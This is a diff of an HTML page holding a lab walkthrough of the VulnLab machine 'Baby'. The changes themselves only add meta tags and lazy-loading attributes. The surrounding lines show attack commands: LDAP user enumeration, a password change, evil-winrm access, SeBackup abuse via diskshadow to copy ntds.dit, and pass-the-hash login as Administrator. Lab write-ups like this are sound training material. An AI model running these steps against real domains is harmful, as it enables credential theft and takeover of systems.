@@ -3,6 +3,18 @@
 <head>
     <meta charset="utf-8">
     <title>VulnLab: Baby | HackWithJordan</title>
+    <!-- site-meta -->
+    <meta name="description" content="Walkthrough of the VulnLab machine Baby, from first foothold to full compromise.">
+    <link rel="canonical" href="https://hackwithjordan.com/posts/2025-03-08-Baby(VulnLab).html">
+    <meta property="og:type" content="article">
+    <meta property="og:site_name" content="HackWithJordan">
+    <meta property="og:title" content="VulnLab: Baby">
+    <meta property="og:description" content="Walkthrough of the VulnLab machine Baby, from first foothold to full compromise.">
+    <meta property="og:url" content="https://hackwithjordan.com/posts/2025-03-08-Baby(VulnLab).html">
+    <meta property="og:image" content="https://hackwithjordan.com/assets/room/poster.jpg">
+    <meta name="twitter:card" content="summary_large_image">
+    <meta property="article:published_time" content="2025-03-08">
+    <!-- /site-meta -->
     <meta name="viewport" content="width=device-width, initial-scale=1">
     <link rel="stylesheet" href="../assets/css/syntax.css">
     <style>
@@ -308,43 +320,43 @@
 
         <p>Login does not work for teresa.bell though</p>
 
-        <img alt="Screenshot 2" height="118" src="../img/posts/2025-03-08-Baby(VulnLab)/02-20c6388ea6.png" style="aspect-ratio:1232/118;" width="1232"/>
+        <img loading="lazy" decoding="async" alt="Screenshot 2" height="118" src="../img/posts/2025-03-08-Baby(VulnLab)/02-20c6388ea6.png" style="aspect-ratio:1232/118;" width="1232"/>
 
         <p>We can get a list of users with the command below</p>
 
         <pre class="terminal"><code>ldapsearch -H ldap://10.10.124.185 -x -b 'DC=baby,DC=vl' -s sub "(&amp;(objectclass=user))"  | grep sAMAccountName: | cut -f2 -d" "</code></pre>
 
-        <img alt="Screenshot 3" height="238" src="../img/posts/2025-03-08-Baby(VulnLab)/03-b8e492192f.png" style="aspect-ratio:1074/238;" width="1074"/>
+        <img loading="lazy" decoding="async" alt="Screenshot 3" height="238" src="../img/posts/2025-03-08-Baby(VulnLab)/03-b8e492192f.png" style="aspect-ratio:1074/238;" width="1074"/>
 
         <p>But the password still doesn't work for any other users on the machine. However one user has an interesting popup</p>
 
-        <img alt="Screenshot 4" height="261" src="../img/posts/2025-03-08-Baby(VulnLab)/04-08caf786ea.png" style="aspect-ratio:1225/261;" width="1225"/>
+        <img loading="lazy" decoding="async" alt="Screenshot 4" height="261" src="../img/posts/2025-03-08-Baby(VulnLab)/04-08caf786ea.png" style="aspect-ratio:1225/261;" width="1225"/>
 
         <p>We can change this using impacket-changepasswd</p>
 
         <pre class="terminal"><code>impacket-changepasswd 'Caroline.Robinson:BabyStart123!@baby.vl' -newpass Password2</code></pre>
 
-        <img alt="Screenshot 5" height="180" src="../img/posts/2025-03-08-Baby(VulnLab)/05-54f23d2990.png" style="aspect-ratio:725/180;" width="725"/>
+        <img loading="lazy" decoding="async" alt="Screenshot 5" height="180" src="../img/posts/2025-03-08-Baby(VulnLab)/05-54f23d2990.png" style="aspect-ratio:725/180;" width="725"/>
 
         <p>Confirmed the changed worked</p>
 
-        <img alt="Screenshot 6" height="237" src="../img/posts/2025-03-08-Baby(VulnLab)/06-c81e9708c6.png" style="aspect-ratio:1231/237;" width="1231"/>
+        <img loading="lazy" decoding="async" alt="Screenshot 6" height="237" src="../img/posts/2025-03-08-Baby(VulnLab)/06-c81e9708c6.png" style="aspect-ratio:1231/237;" width="1231"/>
 
         <p>We have evil-winrm access</p>
 
         <pre class="terminal"><code>evil-winrm -i baby.vl -u caroline.robinson -p Password2</code></pre>
 
-        <img alt="Screenshot 7" height="212" src="../img/posts/2025-03-08-Baby(VulnLab)/07-55c5db5b88.png" style="aspect-ratio:695/212;" width="695"/>
+        <img loading="lazy" decoding="async" alt="Screenshot 7" height="212" src="../img/posts/2025-03-08-Baby(VulnLab)/07-55c5db5b88.png" style="aspect-ratio:695/212;" width="695"/>
 
         <p>Grab the user flag</p>
 
-        <img alt="Screenshot 8" height="292" src="../img/posts/2025-03-08-Baby(VulnLab)/08-396b7263aa.png" style="aspect-ratio:730/292;" width="730"/>
+        <img loading="lazy" decoding="async" alt="Screenshot 8" height="292" src="../img/posts/2025-03-08-Baby(VulnLab)/08-396b7263aa.png" style="aspect-ratio:730/292;" width="730"/>
 
         <p>We have SeBackup so we can use that to grab the admin flag</p>
 
-        <img alt="Screenshot 9" height="163" src="../img/posts/2025-03-08-Baby(VulnLab)/09-bc3c2ab85a.png" style="aspect-ratio:577/163;" width="577"/>
+        <img loading="lazy" decoding="async" alt="Screenshot 9" height="163" src="../img/posts/2025-03-08-Baby(VulnLab)/09-bc3c2ab85a.png" style="aspect-ratio:577/163;" width="577"/>
 
-        <img alt="Screenshot 10" height="545" src="../img/posts/2025-03-08-Baby(VulnLab)/10-942f2999a5.png" style="aspect-ratio:1008/545;" width="1008"/>
+        <img loading="lazy" decoding="async" alt="Screenshot 10" height="545" src="../img/posts/2025-03-08-Baby(VulnLab)/10-942f2999a5.png" style="aspect-ratio:1008/545;" width="1008"/>
 
         <p>We can download the SAM database but the ntlm for admin is incorrect.</p>
 
@@ -367,7 +379,7 @@ echo "expose %temp% z:" | out-file ./diskshadow.txt -encoding ascii -append</cod
 
         <pre class="terminal"><code>diskshadow.exe /s c:\temp\diskshadow.txt</code></pre>
 
-        <img alt="Screenshot 11" height="551" src="../img/posts/2025-03-08-Baby(VulnLab)/11-e4db2118b8.png" style="aspect-ratio:1022/551;" width="1022"/>
+        <img loading="lazy" decoding="async" alt="Screenshot 11" height="551" src="../img/posts/2025-03-08-Baby(VulnLab)/11-e4db2118b8.png" style="aspect-ratio:1022/551;" width="1022"/>
 
         <p>Then we can copy the ntds.dit here and download it</p>
 
@@ -377,13 +389,13 @@ echo "expose %temp% z:" | out-file ./diskshadow.txt -encoding ascii -append</cod
 
         <p>Then we use impacket to dump the new hashes and get a valid hash for admin</p>
 
-        <img alt="Screenshot 12" height="480" src="../img/posts/2025-03-08-Baby(VulnLab)/12-b0dae3d4f3.png" style="aspect-ratio:955/480;" width="955"/>
+        <img loading="lazy" decoding="async" alt="Screenshot 12" height="480" src="../img/posts/2025-03-08-Baby(VulnLab)/12-b0dae3d4f3.png" style="aspect-ratio:955/480;" width="955"/>
 
         <pre class="terminal"><code>evil-winrm -i 10.10.71.244 -u Administrator -H ee4457ae59f1e3fbd764e33d9cef123d</code></pre>
 
-        <img alt="Screenshot 13" height="250" src="../img/posts/2025-03-08-Baby(VulnLab)/13-df5d9034a6.png" style="aspect-ratio:822/250;" width="822"/>
+        <img loading="lazy" decoding="async" alt="Screenshot 13" height="250" src="../img/posts/2025-03-08-Baby(VulnLab)/13-df5d9034a6.png" style="aspect-ratio:822/250;" width="822"/>
 
-        <img alt="Screenshot 14" height="601" src="../img/posts/2025-03-08-Baby(VulnLab)/14-d839ae615a.png" style="aspect-ratio:533/601;" width="533"/>
+        <img loading="lazy" decoding="async" alt="Screenshot 14" height="601" src="../img/posts/2025-03-08-Baby(VulnLab)/14-d839ae615a.png" style="aspect-ratio:533/601;" width="533"/>
     </article>
 
 <script>
